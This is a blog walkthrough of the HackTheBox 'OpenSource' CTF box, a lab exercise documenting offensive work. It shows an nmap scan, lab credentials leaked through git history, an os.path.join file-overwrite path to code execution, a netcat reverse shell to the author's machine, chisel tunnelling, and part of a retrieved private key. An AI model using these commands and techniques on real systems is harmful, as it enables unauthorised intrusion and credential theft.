<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="HackTheBox - OpenSource" /><meta property="og:locale" content="en" /><meta name="description" content="HTB - OpenSource walkthrough" /><meta property="og:description" content="HTB - OpenSource walkthrough" /><link rel="canonical" href="https://jayden-lind.github.io/posts/htb-opensource/" /><meta property="og:url" content="https://jayden-lind.github.io/posts/htb-opensource/" /><meta property="og:site_name" content="Jayden Lind - Portfolio" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-06-01T00:00:00+10:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox - OpenSource" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-07-30T21:15:56+10:00","datePublished":"2022-06-01T00:00:00+10:00","description":"HTB - OpenSource walkthrough","headline":"HackTheBox - OpenSource","mainEntityOfPage":{"@type":"WebPage","@id":"https://jayden-lind.github.io/posts/htb-opensource/"},"url":"https://jayden-lind.github.io/posts/htb-opensource/"}</script><title>HackTheBox - OpenSource | Jayden Lind - Portfolio</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Jayden Lind - Portfolio"><meta name="application-name" content="Jayden Lind - Portfolio"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://jayden-lind.github.io/img/icon.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/">Jayden Lind - Portfolio</a></div><div class="site-subtitle font-italic">Homelab, Software Engineering, Security</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a><li class="nav-item"> <a href="/homelab/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>HOMELAB</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/jayden-lind" aria-label="github" target="_blank" rel="noopener noreferrer"> <i class="fab fa-github"></i> </a> <a href="javascript:location.href = 'mailto:' + ['jayden','linds.com.au'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/jayden-lind/" aria-label="linkedin" target="_blank" rel="noopener noreferrer"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox - OpenSource</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>HackTheBox - OpenSource</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1654005600" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jun 1, 2022 </em> </span> <span> Updated <em class="" data-ts="1659179756" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jul 30, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/jayden-lind">jayden-lind</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1851 words"> <em>10 min</em> read</span></div></div></div><div class="post-content"><h1 id="htb---opensource-walkthrough">HTB - OpenSource walkthrough</h1><p>OpenSource was a harder than initially thought box, I got lost in some rabbit holes, such as escaping the docker container, the Werkzueg console etc. Even though this box is rated as an "Easy" box I would say this was more of a Medium box, as the previous box, Noter was more simpler than this.</p><p><a href="/img/2022/06/OpenSource.png" class="popup img-link "><img data-src="/img/2022/06/OpenSource.png" alt="image" class="lazyload" data-proofer-ignore></a></p><h2 id="initial"><span class="mr-2">Initial</span><a href="#initial" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Let's start with a quick NMAP scan</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
</pre><td class="rouge-code"><pre>┌─[jayden@JD-Desktop]─[~/ctf/openssource]
└──╼ $nmap -sC -sV -p- -oA openssource 10.10.11.164
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-30 21:11 AEST
Nmap scan report for 10.10.11.164
Host is up (0.015s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Mon, 30 May 2022 11:11:31 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 1360
|     Connection: close
|     &lt;html lang="en"&gt;
|     &lt;head&gt;
|     &lt;meta charset="UTF-8"&gt;
|     &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
|     &lt;title&gt;upcloud - Upload files for Free!&lt;/title&gt;
|     &lt;script src="/static/vendor/jquery/jquery-3.4.1.min.js"&gt;&lt;/script&gt;
|     &lt;script src="/static/vendor/popper/popper.min.js"&gt;&lt;/script&gt;
|     &lt;script src="/static/vendor/bootstrap/js/bootstrap.min.js"&gt;&lt;/script&gt;
|     &lt;script src="/static/js/ie10-viewport-bug-workaround.js"&gt;&lt;/script&gt;
|     &lt;link rel="stylesheet" href="/static/vendor/bootstrap/css/bootstrap.css"/&gt;
|     &lt;link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-grid.css"/&gt;
|     &lt;link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-reboot.css"/&gt;
|     &lt;link rel="
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Mon, 30 May 2022 11:11:31 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, HEAD, GET, POST
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     &lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd"&gt;
|     &lt;html&gt;
|     &lt;head&gt;
|     &lt;meta http-equiv="Content-Type" content="text/html;charset=utf-8"&gt;
|     &lt;title&gt;Error response&lt;/title&gt;
|     &lt;/head&gt;
|     &lt;body&gt;
|     &lt;h1&gt;Error response&lt;/h1&gt;
|     &lt;p&gt;Error code: 400&lt;/p&gt;
|     &lt;p&gt;Message: Bad request version ('RTSP/1.0').&lt;/p&gt;
|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;
|     &lt;/body&gt;
|_    &lt;/html&gt;
|_http-title: upcloud - Upload files for Free!
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
3000/tcp filtered ppp
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.92%I=7%D=5/30%Time=6294A663%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,5FF,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.1\.2\x20Py
SF:thon/3\.10\.3\r\nDate:\x20Mon,\x2030\x20May\x202022\x2011:11:31\x20GMT\
SF:r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x201
SF:360\r\nConnection:\x20close\r\n\r\n&lt;html\x20lang=\"en\"&gt;\n&lt;head&gt;\n\x20\
SF:x20\x20\x20&lt;meta\x20charset=\"UTF-8\"&gt;\n\x20\x20\x20\x20&lt;meta\x20name=\
SF:"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\"&gt;\n
SF:\x20\x20\x20\x20&lt;title&gt;upcloud\x20-\x20Upload\x20files\x20for\x20Free!&lt;
SF:/title&gt;\n\n\x20\x20\x20\x20&lt;script\x20src=\"/static/vendor/jquery/jquer
SF:y-3\.4\.1\.min\.js\"&gt;&lt;/script&gt;\n\x20\x20\x20\x20&lt;script\x20src=\"/stati
SF:c/vendor/popper/popper\.min\.js\"&gt;&lt;/script&gt;\n\n\x20\x20\x20\x20&lt;script\
SF:x20src=\"/static/vendor/bootstrap/js/bootstrap\.min\.js\"&gt;&lt;/script&gt;\n\x
SF:20\x20\x20\x20&lt;script\x20src=\"/static/js/ie10-viewport-bug-workaround\
SF:.js\"&gt;&lt;/script&gt;\n\n\x20\x20\x20\x20&lt;link\x20rel=\"stylesheet\"\x20href=
SF:\"/static/vendor/bootstrap/css/bootstrap\.css\"/&gt;\n\x20\x20\x20\x20&lt;lin
SF:k\x20rel=\"stylesheet\"\x20href=\"\x20/static/vendor/bootstrap/css/boot
SF:strap-grid\.css\"/&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\"stylesheet\"\x20hre
SF:f=\"\x20/static/vendor/bootstrap/css/bootstrap-reboot\.css\"/&gt;\n\x20\x2
SF:0\x20\x20&lt;link\x20rel=\"")%r(HTTPOptions,CD,"HTTP/1\.1\x20200\x20OK\r\n
SF:Server:\x20Werkzeug/2\.1\.2\x20Python/3\.10\.3\r\nDate:\x20Mon,\x2030\x
SF:20May\x202022\x2011:11:31\x20GMT\r\nContent-Type:\x20text/html;\x20char
SF:set=utf-8\r\nAllow:\x20OPTIONS,\x20HEAD,\x20GET,\x20POST\r\nContent-Len
SF:gth:\x200\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,1F4,"&lt;!DOCTYP
SF:E\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\"&gt;\n&lt;h
SF:tml&gt;\n\x20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20
SF:http-equiv=\"Content-Type\"\x20content=\"text/html;charset=utf-8\"&gt;\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20&lt;title&gt;Error\x20response&lt;/title&gt;\n\x20\x2
SF:0\x20\x20&lt;/head&gt;\n\x20\x20\x20\x20&lt;body&gt;\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20&lt;h1&gt;Error\x20response&lt;/h1&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error
SF:\x20code:\x20400&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Ba
SF:d\x20request\x20version\x20\('RTSP/1\.0'\)\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20&lt;p&gt;Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\
SF:x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.&lt;/p&gt;\n
SF:\x20\x20\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.60 seconds

┌─[jayden@JD-Desktop]─[~/ctf/openssource]
└──╼ $
</pre></table></code></div></div><p>Lets checkout port 80. We are presented with a normal webpage, which describes an opensource file sharing web program, which allows us to download the source by clicking the blue "Download" button</p><p><a href="/img/2022/06/image-7.png" class="popup img-link shimmer"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 65% 65%'%3E%3C/svg%3E" data-src="/img/2022/06/image-7.png" alt="image" height="65%" width="65%" class="lazyload" data-proofer-ignore></a></p><p>Further down on the homepage, it allows you to try this out on this externally hosted platform.</p><p><a href="/img/2022/06/image-8.png" class="popup img-link shimmer"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 65% 65%'%3E%3C/svg%3E" data-src="/img/2022/06/image-8.png" alt="image" height="65%" width="65%" class="lazyload" data-proofer-ignore></a></p><p>After uploading a file, we are presented with a download link to the recently just uploaded file.</p><p><a href="/img/2022/06/image.png" class="popup img-link shimmer"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 65% 65%'%3E%3C/svg%3E" data-src="/img/2022/06/image.png" alt="image" height="65%" width="65%" class="lazyload" data-proofer-ignore></a></p><p>Let's look through the source code and see if we can find anything that sticks out.<br />First thing to take note, is that there is a .git directory present, first need to check if there's any clues in the git log.</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
</pre><td class="rouge-code"><pre>┌─[✗]─[jayden@JD-Desktop]─[~/ctf/openssource/source]
└──╼ <span class="nv">$git</span> branch
  dev
<span class="k">*</span> public

┌─[jayden@JD-Desktop]─[~/ctf/openssource/source]
└──╼ <span class="nv">$git</span> log
commit 2c67a52253c6fe1f206ad82ba747e43208e8cfd9 <span class="o">(</span>HEAD -&gt; public<span class="o">)</span>
Author: gituser &lt;gituser@local&gt;
Date:   Thu Apr 28 13:55:55 2022 +0200

    clean up dockerfile <span class="k">for </span>production use

commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
Author: gituser &lt;gituser@local&gt;
Date:   Thu Apr 28 13:45:17 2022 +0200

    initial

┌─[✗]─[jayden@JD-Desktop]─[~/ctf/openssource/source]
└──╼ <span class="nv">$git</span> log
commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 <span class="o">(</span>HEAD -&gt; dev<span class="o">)</span>
Author: gituser &lt;gituser@local&gt;
Date:   Thu Apr 28 13:47:24 2022 +0200

    ease testing

commit be4da71987bbbc8fae7c961fb2de01ebd0be1997
Author: gituser &lt;gituser@local&gt;
Date:   Thu Apr 28 13:46:54 2022 +0200

    added gitignore

commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
Author: gituser &lt;gituser@local&gt;
Date:   Thu Apr 28 13:46:16 2022 +0200

┌─[jayden@JD-Desktop]─[~/ctf/openssource/source]
└──╼ <span class="nv">$git</span> checkout dev
Switched to branch <span class="s1">'dev'</span>    updated

commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
Author: gituser &lt;gituser@local&gt;
Date:   Thu Apr 28 13:45:17 2022 +0200

    initial

┌─[jayden@JD-Desktop]─[~/ctf/openssource/source]
└──╼ <span class="nv">$git</span> diff c41fedef2ec6df98735c11b2faf1e79ef492a0f3 a76f8f75f7a4a12b706b0cf9c983796fa1985820 | <span class="nb">tail
</span>new file mode 100644
index 0000000..5975e3f
<span class="nt">---</span> /dev/null
+++ b/app/.vscode/settings.json
@@ <span class="nt">-0</span>,0 +1,5 @@
+<span class="o">{</span>
+  <span class="s2">"python.pythonPath"</span>: <span class="s2">"/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python"</span>,
+  <span class="s2">"http.proxy"</span>: <span class="s2">"http://&lt;strong&gt;dev01:Soulless_Developer#2022&lt;/strong&gt;@10.10.10.128:5187/"</span>,
+  <span class="s2">"http.proxyStrictSSL"</span>: <span class="nb">false</span>
+<span class="o">}</span>
</pre></table></code></div></div><p>Looks like we have a username and password that was used. We will note those creds down for later.</p><p>Now lets checkout the source code ourselves, and see if we can find any bugs/exploits. Before we check the code out, let's find out what branch the active instance is running.</p><p>The difference between the dev and public branch, is that the "dev" branch you POST and GET files from the /upcloud URI, while on the "public" branch it is just the / (root) URI. From this we can determine that the active branch is actually "dev".</p><p>Checking the upload part of the app, `views.py`, we can see how it manages files.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="nd">@app.route</span><span class="p">(</span><span class="s">'/upcloud'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">,</span> <span class="s">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">upload_file</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">'POST'</span><span class="p">:</span>
        <span class="n">f</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">files</span><span class="p">[</span><span class="s">'file'</span><span class="p">]</span>
        <span class="n">file_name</span> <span class="o">=</span> <span class="nf">get_file_name</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="n">filename</span><span class="p">)</span>
        <span class="n">file_path</span> <span class="o">=</span> <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="nf">getcwd</span><span class="p">(),</span> <span class="s">"public"</span><span class="p">,</span> <span class="s">"uploads"</span><span class="p">,</span> <span class="n">file_name</span><span class="p">)</span>
        <span class="n">f</span><span class="p">.</span><span class="nf">save</span><span class="p">(</span><span class="n">file_path</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="s">'success.html'</span><span class="p">,</span> <span class="n">file_url</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">host_url</span> <span class="o">+</span> <span class="s">"uploads/"</span> <span class="o">+</span> <span class="n">file_name</span><span class="p">)</span>
    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="s">'upload.html'</span><span class="p">)</span>


<span class="nd">@app.route</span><span class="p">(</span><span class="s">'/uploads/&lt;path:path&gt;'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">send_report</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
    <span class="n">path</span> <span class="o">=</span> <span class="nf">get_file_name</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
    <span class="k">return</span> <span class="nf">send_file</span><span class="p">(</span><span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="nf">getcwd</span><span class="p">(),</span> <span class="s">"public"</span><span class="p">,</span> <span class="s">"uploads"</span><span class="p">,</span> <span class="n">path</span><span class="p">))</span>

</pre></table></code></div></div><p>What's wrong with this code? The issue is with "os.path.join". Reading the docs of <a href="https://docs.python.org/3/library/os.path.html#os.path.join">os.path.join</a>, we can see that if any of the parameters are an absolute path, all other parameters are thrown away. If we are able to set the path as an absolute path (EX: /app/app.py) we should be able to get a file.</p><p><strong>PROBLEM</strong></p><p>When attempting to use an absolute path on the /uploads/ endpoint, the Werkzueg app normalises the path, so /uploads//etc/passwd, just gets normalised to /uploads/etc/passwd. The other avenue is we could upload a file with the filename of an absolute path.</p><p>Checking the Dockerfile, we can see the location of where the app would be running, then using this short script I wrote, <a href="https://github.com/Jayden-Lind/HTB-Opensource/blob/main/upload.py">upload.py</a> this will POST this <a href="https://github.com/Jayden-Lind/HTB-Opensource/blob/main/views.py">views.py</a> file, with a filename of "/app/app.py". This gives us 2 new routes, /jayden/&lt;file name&gt;, which will allow us to download any file from the host, then also the route /jayden_cmd/&lt;command&gt;, which will allow us to have RCE on this box. The short upload.py script I wrote will then give us a rudimentary shell on the box.</p><p>Now that we have access to this host, we can just escalate to a proper shell,</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>CMD&gt; nc 10.10.14.44 4000 <span class="nt">-e</span> /bin/sh

/app <span class="nv">$ </span><span class="nb">whoami
</span>root
/app <span class="nv">$ </span><span class="nb">hostname
</span>6d796f9974e9
/app <span class="nv">$ </span><span class="nb">cat</span> /.dockerenv 
/app <span class="nv">$ </span>&lt;/code&gt;&lt;/pre&gt;
</pre></table></code></div></div><p>And we can then see that this is a Docker host. Now that we have access we can check for port 3000, on what service is actually running there.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>/app # wget 10.10.11.164:3000
Connecting to 10.10.11.164:3000 (10.10.11.164:3000)
saving to 'index.html'
index.html           100% |********************************| 13414  0:00:00 ETA
'index.html' saved
/app # cat index.html | head
&lt;!DOCTYPE html&gt;
&lt;html lang="en-US" class="theme-"&gt;
&lt;head&gt;
        &lt;meta charset="utf-8"&gt;
        &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;
        &lt;title&gt; Gitea: Git with a cup of tea&lt;/title&gt;
        &lt;link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL29wZW5zb3VyY2UuaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9vcGVuc291cmNlLmh0YjozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ4NTEyIn0seyJzcmMiOiJodHRwOi8vb3BlbnNvdXJjZS5odGI6MzAwMC9hc3NldHMvaW1nL2xvZ28uc3ZnIiwidHlwZSI6ImltYWdlL3N2Zyt4bWwiLCJzaXplcyI6IjUxMng1MTIifV19"/&gt;
        &lt;meta name="theme-color" content="#6cc644"&gt;
        &lt;meta name="default-theme" content="auto" /&gt;
        &lt;meta name="author" content="Gitea - Git with a cup of tea" /&gt;
/app # 
</pre></table></code></div></div><p>It's running what looks like Gitea that's listening on 127.0.0.1:3000. To access this properly from our attacking machine, we can look into <a href="https://github.com/jpillora/chisel">Chisel</a> to relay the traffic so we can actually browse this Gitea instance. First just have to copy the binaries across, which is easy with wget and a local http server on our attacking machine. Once across we have to do the below to proxy the traffic.</p><p><strong>Attacking Machine:</strong> <code class="language-plaintext highlighter-rouge">sudo chisel server --port 3000 -v --reverse --socks5</code></p><p><strong>Client Machine:</strong> <code class="language-plaintext highlighter-rouge">./chisel client 10.10.14.44:3000 R:5000:socks</code></p><p>Need to then enable Firefox to use the Chisel SOCKS proxy, on localhost on port 5000. We can now see Gitea instance. Now let's try and login with the credentials from the proxy we saw in the git diff.</p><p><a href="/img/2022/06/image-9.png" class="popup img-link shimmer"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 65% 65%'%3E%3C/svg%3E" data-src="/img/2022/06/image-9.png" alt="image" height="65%" width="65%" class="lazyload" data-proofer-ignore></a></p><p>After successful login, we can see some backup files, and inside the .ssh folder, we find a private key. Pull this private key down to your local machine.</p><p><a href="/img/2022/06/image-10.png" class="popup img-link shimmer"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 65% 65%'%3E%3C/svg%3E" data-src="/img/2022/06/image-10.png" alt="image" height="65%" width="65%" class="lazyload" data-proofer-ignore></a></p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>┌─[jayden@JD-Desktop]─[~/ctf/openssource]
└──╼ <span class="nv">$cat</span> id_rsa  | <span class="nb">head</span>
<span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----
MIIJKQIBAAKCAgEAqdAaA6cYgiwKTg/6SENSbTBgvQWS6UKZdjrTGzmGSGZKoZ0l
xfb28RAiN7+yfT43HdnsDNJPyo3U1YRqnC83JUJcZ9eImcdtX4fFIEfZ8OUouu6R
u2TPqjGvyVZDj3OLRMmNTR/OUmzQjpNIGyrIjDdvm1/Hkky/CfyXUucFnshJr/BL
